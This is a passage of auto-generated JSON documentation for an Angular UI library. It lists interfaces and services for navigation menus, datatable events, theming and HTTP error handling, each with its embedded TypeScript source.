            "description": "<p>For internal urls: RouterCommands.\nFor external urls, should just be array with one element (the full url)</p>\n",
            "line": 28,
            "rawdescription": "\n\nFor internal urls: RouterCommands.\nFor external urls, should just be array with one element (the full url)\n"
          },
          {
            "name": "type",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MenuItemTypes",
            "optional": false,
            "description": "",
            "line": 23
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "NavigateCommand",
        "id": "interface-NavigateCommand-bd9331e390bf491d6c9ec37613b61f8592c288e4e551820291fa47240cb9690b29cc58d2d972409aa238d0c80636ba1513cb9fe340e10ef0b5ba864a34231163",
        "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "export type Menu = {\r\n  groups: MenuGroup[];\r\n} & Record<string, unknown>;\r\n\r\nexport interface MenuGroup {\r\n  hasDivider?: boolean;\r\n  icon?: string;\r\n  svgIcon?: boolean;\r\n  items: MenuItem[];\r\n  name?: string;\r\n}\r\n\r\nexport interface MenuItem {\r\n  id?: string;\r\n  name?: string;\r\n  icon?: string;\r\n  svgIcon?: boolean;\r\n  command?: MenuItemCommand;\r\n  error?: string;\r\n}\r\n\r\nexport interface MenuItemCommand {\r\n  type: MenuItemTypes;\r\n  /**\r\n   * For internal urls: RouterCommands.\r\n   * For external urls, should just be array with one element (the full url)\r\n   */\r\n  arguments: Array<string | number>;\r\n}\r\n\r\nexport interface NavigateCommand {\r\n  $event: MouseEvent | KeyboardEvent;\r\n  command?: Array<string | number>;\r\n}\r\n\r\nexport enum MenuItemTypes {\r\n  External = 'externalLink',\r\n  ExternalNew = 'externalLinkNewWindow',\r\n  Internal = 'internalLink',\r\n  Navigate = 'navigate'\r\n}\r\n",
        "properties": [
          {
            "name": "$event",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MouseEvent | KeyboardEvent",
            "optional": false,
            "description": "",
            "line": 32
          },
          {
            "name": "command",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Array<string | number>",
            "optional": true,
            "description": "",
            "line": 33
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "RowActivation",
        "id": "interface-RowActivation-ba51dacad4326a052ff9b68d45443e72effc1b6b12130d923b302383e265e42d561c76a40dd12a3ad161b110eeea14165fd88edf87e64cf08cb55200ea6a2454",
        "file": "libs/datatable/src/lib/sto-datatable/events.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { Column } from './columns';\r\n\r\nexport interface ContextMenu {\r\n  event: MouseEvent | KeyboardEvent;\r\n  column: Column;\r\n}\r\n\r\ninterface RowCtx<T extends Record<string, unknown>> {\r\n  row: T;\r\n  index: number;\r\n}\r\n\r\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\r\nexport type HeaderContextMenu = ContextMenu;\r\n\r\ninterface Activate<T extends Record<string, unknown>> {\r\n  row: T;\r\n  event: MouseEvent | KeyboardEvent;\r\n  index: number;\r\n  rowEl?: HTMLDivElement;\r\n}\r\n\r\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\r\n  event: MouseEvent | KeyboardEvent;\r\n}\r\n\r\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\r\n  event: KeyboardEvent;\r\n}\r\n",
        "properties": [
          {
            "name": "event",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "KeyboardEvent",
            "optional": false,
            "description": "",
            "line": 28
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": [],
        "extends": "Activate"
      },
      {
        "name": "RowCtx",
        "id": "interface-RowCtx-ba51dacad4326a052ff9b68d45443e72effc1b6b12130d923b302383e265e42d561c76a40dd12a3ad161b110eeea14165fd88edf87e64cf08cb55200ea6a2454",
        "file": "libs/datatable/src/lib/sto-datatable/events.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { Column } from './columns';\r\n\r\nexport interface ContextMenu {\r\n  event: MouseEvent | KeyboardEvent;\r\n  column: Column;\r\n}\r\n\r\ninterface RowCtx<T extends Record<string, unknown>> {\r\n  row: T;\r\n  index: number;\r\n}\r\n\r\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\r\nexport type HeaderContextMenu = ContextMenu;\r\n\r\ninterface Activate<T extends Record<string, unknown>> {\r\n  row: T;\r\n  event: MouseEvent | KeyboardEvent;\r\n  index: number;\r\n  rowEl?: HTMLDivElement;\r\n}\r\n\r\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\r\n  event: MouseEvent | KeyboardEvent;\r\n}\r\n\r\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\r\n  event: KeyboardEvent;\r\n}\r\n",
        "properties": [
          {
            "name": "index",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": false,
            "description": "",
            "line": 10
          },
          {
            "name": "row",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "T",
            "optional": false,
            "description": "",
            "line": 9
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "RowSelection",
        "id": "interface-RowSelection-ba51dacad4326a052ff9b68d45443e72effc1b6b12130d923b302383e265e42d561c76a40dd12a3ad161b110eeea14165fd88edf87e64cf08cb55200ea6a2454",
        "file": "libs/datatable/src/lib/sto-datatable/events.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { Column } from './columns';\r\n\r\nexport interface ContextMenu {\r\n  event: MouseEvent | KeyboardEvent;\r\n  column: Column;\r\n}\r\n\r\ninterface RowCtx<T extends Record<string, unknown>> {\r\n  row: T;\r\n  index: number;\r\n}\r\n\r\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\r\nexport type HeaderContextMenu = ContextMenu;\r\n\r\ninterface Activate<T extends Record<string, unknown>> {\r\n  row: T;\r\n  event: MouseEvent | KeyboardEvent;\r\n  index: number;\r\n  rowEl?: HTMLDivElement;\r\n}\r\n\r\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\r\n  event: MouseEvent | KeyboardEvent;\r\n}\r\n\r\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\r\n  event: KeyboardEvent;\r\n}\r\n",
        "properties": [
          {
            "name": "event",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MouseEvent | KeyboardEvent",
            "optional": false,
            "description": "",
            "line": 24
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": [],
        "extends": "Activate"
      },
      {
        "name": "SortColumn",
        "id": "interface-SortColumn-35f01bd4b6f91b717376ea906f65c5d33a4c7f52570dd7f39f08b0859005eaa9b9d5d9889d8f5a74dac003e1107f57c7fe79a86f8afd1964e74817dde91515ad",
        "file": "libs/datatable/src/lib/sto-datatable/models.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "export interface SortColumn {\r\n  id: string;\r\n  sortDir: 'asc' | 'desc' | null;\r\n}\r\n\r\nexport type rowClassFn = <T>(row: T) => string;\r\n",
        "properties": [
          {
            "name": "id",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": false,
            "description": "",
            "line": 2
          },
          {
            "name": "sortDir",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "\"asc\" | \"desc\" | null",
            "optional": false,
            "description": "",
            "line": 3
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "StoErrorHandler",
        "id": "interface-StoErrorHandler-b62d76eb54701a6b99a9648adc50d2507a27e68be985d86dd50ad12d40f9aaf5c93cc2e6c1038ad8899110984eec045c1e065cd4f097a7a8f561c04887b2d795",
        "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\r\nimport { HttpError } from './http-error';\r\n\r\n/**\r\n * Public interface for the error handler class.\r\n */\r\nexport interface StoErrorHandler {\r\n  [ code: number ]: Handler;\r\n\r\n  getErrorText?: (err: HttpErrorResponse) => string;\r\n}\r\n\r\n/**\r\n * Internal interface for our errorhandler.\r\n */\r\nexport interface ErrorHandler extends StoErrorHandler {\r\n  handler: (err: HttpErrorResponse, handler?: Handler) => void;\r\n  defaultHandler: Handler;\r\n}\r\n\r\n/**\r\n * Interface for the ErrorLogger injection token.\r\n */\r\nexport interface ErrorLogger {\r\n  log: (arg0: HttpError) => void;\r\n}\r\n\r\n// Expected signature for error handlers.\r\nexport type Handler = (err: HttpErrorResponse) => HttpError;\r\n\r\n",
        "properties": [
          {
            "name": "getErrorText",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "function",
            "optional": true,
            "description": "",
            "line": 10
          }
        ],
        "indexSignatures": [
          {
            "id": "index-declaration-b62d76eb54701a6b99a9648adc50d2507a27e68be985d86dd50ad12d40f9aaf5c93cc2e6c1038ad8899110984eec045c1e065cd4f097a7a8f561c04887b2d795",
            "args": [
              {
                "name": "code",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "Handler",
            "line": 7,
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "kind": 165,
        "description": "<p>Public interface for the error handler class.</p>\n",
        "rawdescription": "\n\nPublic interface for the error handler class.\n",
        "methods": []
      },
      {
        "name": "ThemeModel",
        "id": "interface-ThemeModel-5518451c8bdeae935ed16c7aa1e7fbc1697e915493187425de075ad0b7fdb48b9c71c53d6da2ab85195d30965b910b40762334aad6412ef38293fc0cf8348e3e",
        "file": "libs/common/src/lib/theme/models.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "export type ThemeName = 'light' | 'dark';\r\nexport type ThemeClassName = 'sto-light-theme' | 'sto-dark-theme';\r\nexport type TypographyName = 'small' | 'medium' | 'large';\r\nexport type TypographyClassName = 'sto-sm-typography' | 'sto-m-typography' | 'sto-l-typography';\r\n\r\nexport const themes = new Map<ThemeName, ThemeClassName>([\r\n  [ 'light', 'sto-light-theme' ],\r\n  [ 'dark', 'sto-dark-theme' ],\r\n]);\r\n\r\nexport const typography = new Map<TypographyName, TypographyClassName>([\r\n  [ 'small', 'sto-sm-typography' ],\r\n  [ 'medium', 'sto-m-typography' ],\r\n  [ 'large', 'sto-l-typography' ],\r\n]);\r\n\r\nexport interface ThemeModel<T = ThemeName | TypographyName> {\r\n  id?: string;\r\n  type: 'typography' | 'theme';\r\n  value: T;\r\n}\r\n",
        "properties": [
          {
            "name": "id",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 18
          },
          {
            "name": "type",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "\"typography\" | \"theme\"",
            "optional": false,
            "description": "",
            "line": 19
          },
          {
            "name": "value",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "T",
            "optional": false,
            "description": "",
            "line": 20
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "ThemeSaver",
        "id": "interface-ThemeSaver-9f3646a28336bb924cadecd5607c989443edb948c1737023433478cc0edfbf8a183a5d31aa1ac2d4b508c3de9ca988279764d49f0f34b3b5488e7e9c7464ed29",
        "file": "libs/common/src/lib/theme/theme-saver.service.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { Injectable, InjectionToken } from '@angular/core';\r\nimport { ThemeModel, ThemeName, TypographyName } from './models';\r\nimport { Observable, of } from 'rxjs';\r\n\r\ntype ReturnValue<T> = Promise<T> | Observable<T> | T;\r\n\r\nexport interface ThemeSaver<T = ReturnValue<ThemeModel>> {\r\n  save(model: ThemeModel): T;\r\n\r\n  load(type?: 'typography' | 'theme'): T;\r\n\r\n  remove?(): ReturnValue<void>;\r\n}\r\n\r\nexport const THEME_SAVER = new InjectionToken<ThemeSaver>('sto__theme__typo');\r\n\r\n@Injectable({ providedIn: 'root' })\r\nexport class ThemeSaverService implements ThemeSaver {\r\n  load(type: 'typography' | 'theme'): Observable<ThemeModel> {\r\n    let value = localStorage.getItem('tops__' + type) as TypographyName | ThemeName;\r\n    if ( !value ) {\r\n      value = type === 'typography' ? 'medium' : 'light';\r\n    }\r\n    return of({ value, type });\r\n  }\r\n\r\n  save(model: ThemeModel): Observable<ThemeModel> {\r\n    localStorage.setItem('tops__' + model.type, model.value);\r\n    return of(model);\r\n  }\r\n}\r\n",
        "properties": [],
        "indexSignatures": [],
        "kind": 167,
        "methods": [
          {
            "name": "load",
            "args": [
              {
                "name": "type",
                "type": "\"typography\" | \"theme\"",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true
              }
            ],
            "optional": false,
            "returnType": "T",
            "typeParameters": [],
            "line": 10,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "type",
                "type": "\"typography\" | \"theme\"",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true,
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "remove",
            "args": [],
            "optional": true,
            "returnType": "ReturnValue<void>",
            "typeParameters": [],
            "line": 12,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "save",
            "args": [
              {
                "name": "model",
                "type": "ThemeModel",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "T",
            "typeParameters": [],
            "line": 8,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "model",
                "type": "ThemeModel",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ]
      }
    ],
    "injectables": [
      {
        "name": "ConfirmService",
        "id": "injectable-ConfirmService-116def7b9c0472ca3cf681531d4128654a788b948cba6c3405919afd4ddcd97665488ea3e369ef224bfd7bcf8dfed7b0496ebbcf41bc2a5c6f3742eacd45fa2c",
        "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
        "properties": [
          {
            "name": "ref",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MatDialogRef<ConfirmComponent> | null",
            "optional": false,
            "description": "",
            "line": 12,
            "modifierKind": [
              123
            ]
          }
        ],
        "methods": [
          {
            "name": "confirm",
            "args": [
              {
                "name": "message",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "title",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "'Confirm'"
              },
              {
                "name": "confirmText",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "'OK'"
              },
              {
                "name": "showCancel",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "true"
              },
              {
                "name": "options",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "dialogConfig"
              }
            ],
            "optional": false,
            "returnType": "Observable<boolean>",
            "typeParameters": [],
            "line": 17,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "message",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "title",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "'Confirm'",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "confirmText",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "'OK'",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "showCancel",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "true",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "options",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "dialogConfig",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Injectable } from '@angular/core';\r\nimport { MatDialog, MatDialogConfig, MatDialogRef } from '@angular/material/dialog';\r\nimport { Observable, ReplaySubject } from 'rxjs';\r\nimport { ConfirmComponent } from './sto-confirm-dialog.component';\r\n\r\nconst dialogConfig = new MatDialogConfig();\r\ndialogConfig.width = '560px';\r\ndialogConfig.panelClass = 'sto-dialog';\r\n\r\n@Injectable()\r\nexport class ConfirmService {\r\n  public ref: MatDialogRef<ConfirmComponent> | null;\r\n\r\n  constructor(private dialog: MatDialog) {\r\n  }\r\n\r\n  confirm(message: string, title = 'Confirm', confirmText = 'OK', showCancel = true, options = dialogConfig): Observable<boolean> {\r\n    this.ref = this.dialog.open(ConfirmComponent, {\r\n      ...options,\r\n      data: { message, title, confirmText, showCancel }\r\n    });\r\n\r\n    const subject = new ReplaySubject<boolean>();\r\n\r\n    this.ref.afterClosed()\r\n      .subscribe(result => {\r\n        this.ref = null;\r\n        subject.next(result);\r\n        subject.complete();\r\n      });\r\n    return subject;\r\n  }\r\n\r\n}\r\n",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "dialog",
              "type": "MatDialog",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 12,
          "jsdoctags": [
            {
              "name": "dialog",
              "type": "MatDialog",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "type": "injectable"
      },
      {
        "name": "ErrorDialogService",
        "id": "injectable-ErrorDialogService-640f56877a48e7ca58060a01547a2886a9c77544a0803aba2e5699c16a9fbf09b5af09ff14812882acf8ea392f89a245a5e665c2872732e2ba0b556f6a8b3fff",
        "file": "libs/error-handler/src/lib/error-handler/error-dialog.service.ts",
        "properties": [
          {
            "name": "ref",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MatDialogRef<DialogComponent>",
            "optional": false,
            "description": "",
            "line": 10,
            "modifierKind": [
              121
            ]
          }
        ],
        "methods": [
          {
            "name": "open",
            "args": [
              {
                "name": "err",
                "type": "HttpError",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "MatDialogRef<DialogComponent, >",
            "typeParameters": [],
            "line": 16,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpError",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Injectable } from '@angular/core';\r\nimport { MatDialog, MatDialogRef } from '@angular/material/dialog';\r\nimport { HttpError } from './http-error';\r\nimport { DialogComponent } from './dialog/dialog.component';\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class ErrorDialogService {\r\n  private ref: MatDialogRef<DialogComponent>;\r\n\r\n  constructor(private dialog: MatDialog) {\r\n  }\r\n\r\n  // Opens a dialog, and returns the reference with the close results.\r\n  open(err: HttpError): MatDialogRef<DialogComponent, unknown> {\r\n    if ( this.ref ) {\r\n      this.ref.close(null);\r\n    }\r\n    this.ref = this.dialog.open(DialogComponent, {\r\n      data: err,\r\n      width: '560px',\r\n      autoFocus: false,\r\n      disableClose: true,\r\n      panelClass: 'sto-dialog'\r\n    });\r\n    return this.ref;\r\n  }\r\n}\r\n",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "dialog",
              "type": "MatDialog",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 10,
          "jsdoctags": [
            {
              "name": "dialog",
              "type": "MatDialog",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "type": "injectable"
      },
      {
        "name": "ErrorHandlerImpl",
        "id": "injectable-ErrorHandlerImpl-498d07118640af56499aaf20a9c2077b6c46bba76c932ab22263dfc299f2b7fbb43f9db943817229ad0b0c07b271332e5027c9507031fbd4d3d97378542b334b",
        "file": "libs/error-handler/src/lib/wrapper.ts",
        "properties": [],
        "methods": [
          {
            "name": "401",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 78,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\r\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\r\nimport { CommonModule } from '@angular/common';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport {\r\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\r\n  ErrorHandlerService,\r\n  Handler,\r\n  HttpError,\r\n  StoErrorHandler\r\n} from '@ngx-stoui/error-handler';\r\n\r\n@Component({\r\n  selector: 'next-wrapper',\r\n  template: `\r\n    <button mat-button\r\n            (click)=\"overRide(404)\">Overridden 404\r\n    </button>\r\n    <button mat-button\r\n            (click)=\"showError(s)\"\r\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\r\n  `,\r\n  providers: []\r\n})\r\nexport class NextWrapperComponent {\r\n  public errors = [\r\n    0,\r\n    400,\r\n    401,\r\n    403,\r\n    404,\r\n    409,\r\n    500,\r\n    501,\r\n    503\r\n  ];\r\n\r\n  constructor(private service: ErrorHandlerService) {\r\n  }\r\n\r\n  showError(status: number) {\r\n    const err = new HttpErrorResponse({\r\n      status,\r\n      error: {\r\n        message: 'server error message'\r\n      },\r\n      statusText: 'Error',\r\n      url: 'http://errorhandler/api'\r\n    });\r\n    this.service.handler(err);\r\n  }\r\n\r\n  overRide(status: number) {\r\n    const err = new HttpErrorResponse({\r\n      status,\r\n      error: {\r\n        message: 'server error message'\r\n      },\r\n      statusText: 'Error',\r\n      url: 'http://errorhandler/api'\r\n    });\r\n    const handler = function (err: HttpErrorResponse) {\r\n      const e = new HttpError(err);\r\n      e.title = 'Local override 404';\r\n      e.text = 'Local override not found item';\r\n      return e;\r\n    };\r\n    this.service.handler(err, handler);\r\n  }\r\n}\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class ErrorHandlerImpl implements StoErrorHandler {\r\n  [ code: number ]: Handler;\r\n\r\n  401(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = 'Custom not signed in';\r\n    error.text = 'Custom not signed in text';\r\n    return error;\r\n  }\r\n}\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class Logger {\r\n  constructor(private http: HttpClient) {\r\n  }\r\n\r\n  log(err: HttpError) {\r\n    // This method will typically go to the application backend or a central log repository\r\n    console.log('Error', err);\r\n  }\r\n}\r\n\r\nfunction LoggerFactory(http: HttpClient) {\r\n  return new Logger(http);\r\n}\r\n\r\n@NgModule({\r\n  declarations: [ NextWrapperComponent ],\r\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\r\n  exports: [ NextWrapperComponent ],\r\n  providers: [\r\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\r\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\r\n  ]\r\n})\r\nexport class WrapperModule {\r\n}\r\n\r\n",
        "type": "injectable"
      },
      {
        "name": "ErrorHandlerService",
        "id": "injectable-ErrorHandlerService-b4320e093a21816dae450208663ffdc925fa332325f1f4c1a4bcf71c74ba2f2e19719c191412fdef6cf5576531c0e584c06e1d495cbaea80476821f9f520c521",
        "file": "libs/error-handler/src/lib/error-handler/error-handler.service.ts",
        "properties": [],
        "methods": [
          {
            "name": "0",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 72,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "400",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 87,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "401",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 97,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "403",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 105,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "404",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 116,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "409",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 127,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "500",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 140,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "501",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 153,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "503",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 157,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "defaultHandler",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 57,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "getErrorText",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 167,
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nUses the getErrorText from the provided custom handler, if available.\nOtherwise, return the error message, if available in our desired format\nExpected err.error -> { message: 'A message', ... }\nAlso handles text as a fallback.\n",
            "description": "<p>Uses the getErrorText from the provided custom handler, if available.\nOtherwise, return the error message, if available in our desired format\nExpected err.error -&gt; { message: &#39;A message&#39;, ... }\nAlso handles text as a fallback.</p>\n",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "handler",
            "args": [
              {
                "name": "err",
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "handler",
                "type": "Handler",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 31,
